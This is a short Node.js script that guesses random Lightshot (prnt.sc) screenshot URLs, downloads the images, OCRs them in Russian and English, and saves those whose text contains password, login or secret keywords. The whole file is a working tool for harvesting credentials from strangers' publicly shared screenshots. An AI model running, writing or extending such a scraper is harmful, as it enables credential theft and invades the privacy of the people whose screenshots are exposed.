// Made by Milk_Cool
// Usage: "node index.js"
// or "node index.js only-s" to only show successful attempts

const tesseract = require("node-tesseract-ocr");
const fs = require("fs");
const { JSDOM } = require("jsdom");
const fetch = require("node-fetch");
const Downloader = require("nodejs-file-downloader");

const rusKeywords = ["парол", "логин", "пользовател", "вход", "войти", "секрет"];
const engKeywords = ["pass", "login", "log in", "user", "secret", "signin", "sign in"];
const removed = "https://st.prntscr.com/2022/09/11/1722/img/0_173a7b_211be8ff.png";

const genURL = () => "https://prnt.sc/1" + Math.random().toString(36).slice(2, 7);

if(process.argv.includes("h")) console.clear();

(async () => {
	while(true){
		const url = genURL();
		const res = await fetch(url);
		const text = await res.text();
		const dom = new JSDOM(text);
		let src = dom.window.document.querySelector("#screenshot-image")?.src;
		if(src.startsWith("//")) src = "https:" + src;
		if(!src || src == removed){
			if(!process.argv.includes("only-s")) console.log(url, "E: Image removed!");
			continue;
		}
		const dl = new Downloader({
			"url": src,
			"directory": "lightshot"
		});
		let filePath
		try{
			filePath = (await dl.download()).filePath;
		}catch(_){
			if(!process.argv.includes("only-s")) console.log(url, "E: Can't download!");
			continue;
		}
		if(filePath === undefined){
			if(!process.argv.includes("only-s")) console.log(url, "U: Error 2!");
			continue;
		}
		let rusText, engText;
		try{
			rusText = await tesseract.recognize(filePath, { "lang": "rus" });
			engText = await tesseract.recognize(filePath, { "lang": "eng" });
		}catch(_){
			if(!process.argv.includes("only-s")) console.log(url, "E: Can't read text!");
			// fs.unlinkSync(filePath);
			continue;
		}
		if(rusText === undefined || engText === undefined){
			if(!process.argv.includes("only-s")) console.log(url, "U: Error 1!");
			fs.unlinkSync(filePath);
			continue;
		}
		let flag = false;
		for(let i of rusKeywords)
			if(rusText.includes(i)){
				flag = true;
				break;
			}
		if(!flag) for(let i of engKeywords)
			if(engText.includes(i)){
				flag = true;
				break;
			}
		if(flag)
			console.log(url, `S: Image saved as ${filePath}!`);
		else{
			if(!process.argv.includes("only-s")) console.log(url, `F: Image doesn't seem to contain passwords.`);
			fs.unlinkSync(filePath);
		}
	}
})();
